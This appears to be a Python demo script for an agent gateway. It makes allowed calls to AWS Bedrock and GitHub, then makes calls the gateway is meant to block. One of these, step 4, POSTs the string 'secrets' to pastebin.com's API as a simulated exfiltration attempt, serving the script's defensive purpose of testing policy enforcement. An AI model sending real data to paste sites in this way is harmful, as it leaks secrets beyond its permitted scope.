"""Demo agent for the Agent Harness.

Makes a mix of allowed and disallowed requests so the gateway has something
to show: Bedrock (allowed model), GitHub (allowed), then a different Bedrock
model and a non-allowlisted host (to be blocked).

Credentials come from the environment (AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY,
AWS_SESSION_TOKEN). Never hardcode them. Run standalone first to confirm Bedrock
works, then run it under the harness.
"""

import os
import sys
import time

import boto3
import httpx
from botocore.config import Config
from dotenv import load_dotenv

load_dotenv()

REGION = os.getenv("AWS_REGION", "us-east-1")
# Inference profile ID (needs the us. prefix). See the Bedrock guide.
ALLOWED_MODEL = os.getenv("BEDROCK_MODEL_ID", "us.meta.llama4-scout-17b-instruct-v1:0")
# A second model the policy should NOT allow.
BLOCKED_MODEL = os.getenv("BEDROCK_BLOCKED_MODEL_ID", "amazon.titan-text-lite-v1")
PAUSE = float(os.getenv("DEMO_PAUSE", "2"))

# boto3 honors HTTPS_PROXY / AWS_CA_BUNDLE from the environment automatically.
client = boto3.client(
    "bedrock-runtime",
    region_name=REGION,
    aws_access_key_id=os.getenv("AWS_ACCESS_KEY_ID"),
    aws_secret_access_key=os.getenv("AWS_SECRET_ACCESS_KEY"),
    aws_session_token=os.getenv("AWS_SESSION_TOKEN"),
    config=Config(retries={"max_attempts": 1}, read_timeout=60),
)


def step(msg: str) -> None:
    print(f"\n=== {msg}", flush=True)
    time.sleep(PAUSE)


def ask_bedrock(model_id: str, prompt: str) -> None:
    try:
        resp = client.converse(
            modelId=model_id,
            messages=[{"role": "user", "content": [{"text": prompt}]}],
            inferenceConfig={"maxTokens": 256, "temperature": 0.5, "topP": 0.9},
        )
        content = resp["output"]["message"]["content"]
        text = next((c["text"] for c in content if "text" in c), "")
        print(f"[bedrock:{model_id}] {text.strip()}", flush=True)
    except Exception as e:  # noqa: BLE001 - demo script, show any failure
        print(f"[bedrock:{model_id}] ERROR {type(e).__name__}: {e}", flush=True)


def http_get(url: str) -> None:
    try:
        r = httpx.get(url, timeout=15, follow_redirects=True)
        print(f"[http] GET {url} -> {r.status_code}", flush=True)
    except Exception as e:  # noqa: BLE001
        print(f"[http] GET {url} ERROR {type(e).__name__}: {e}", flush=True)


def main() -> int:
    step("1. Ask the approved Bedrock model (should be ALLOWED)")
    ask_bedrock(ALLOWED_MODEL, "In one sentence, what is AWS?")

    step("2. Read from GitHub (should be ALLOWED)")
    http_get("https://api.github.com/zen")

    step("3. Ask a different Bedrock model (should be BLOCKED)")
    ask_bedrock(BLOCKED_MODEL, "Say hello.")

    step("4. Send data to a paste site (should be BLOCKED and stop the run)")
    try:
        r = httpx.post("https://pastebin.com/api/api_post.php", data={"api_paste_code": "secrets"}, timeout=15)
        print(f"[http] POST pastebin -> {r.status_code}", flush=True)
    except Exception as e:  # noqa: BLE001
        print(f"[http] POST pastebin ERROR {type(e).__name__}: {e}", flush=True)

    step("5. Still running (should not be reached if the run was stopped)")
    for i in range(30):
        http_get("https://api.github.com/zen")
        time.sleep(PAUSE)
    return 0


if __name__ == "__main__":
    sys.exit(main())
